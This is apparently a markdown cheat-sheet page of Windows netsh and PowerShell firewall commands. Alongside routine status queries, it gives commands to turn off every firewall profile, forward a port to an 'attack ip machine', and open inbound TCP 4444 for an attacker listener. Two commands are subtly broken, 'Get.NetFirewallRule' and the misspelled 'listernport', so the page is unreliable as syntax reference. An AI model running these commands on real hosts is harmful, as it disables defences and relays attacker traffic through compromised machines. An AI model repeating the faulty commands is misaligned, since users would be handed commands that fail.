---
layout: app
title: "Windows Firewall"
image: "https://en.wikipedia.org/wiki/Windows_Firewall#/media/File:Windows_Firewall_icon.png"
tags: ["firewall"]

---

# Show Firewall Profiles

```bash
  netsh advfirewall show allprofiles
```
# Show Firewall State

```bash
netsh advfirewall show state
```
# Get Rule

```bash
Get.NetFirewallRule -PolicyStore [name]
```

# Turn off all Firewall Profiles

```bash 
netsh advfirewall set allprofiles state off
```

# Open Ports

## Port Forward

```powershell
netsh interface portproxy add v4tov4 listernport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress="attack ip machine"
```
------Arguments-----

- **interface portproxy** Set the proxy feature
- **add v4tov4** Indicates the address family IPV4
- **listenport=8080** The system will listen throught 8080 port
- **listenaddress=0.0.0.0** Listen on all interfaces
- **connectport=80** Redirect to 80 destination port
- **connectaddress=aaa.bbb.ccc.ddd** Set the destination address to redirect traffic

## Add rule

```powershell
netsh advfirewall firewall add rule name="<name>" dir=in action=allow protocol=TCP localport=4444
```

## Remove Rule

```powershell
netsh advfirewall firewall delete rule name="<name>" protocol=TCP localport=4444
```

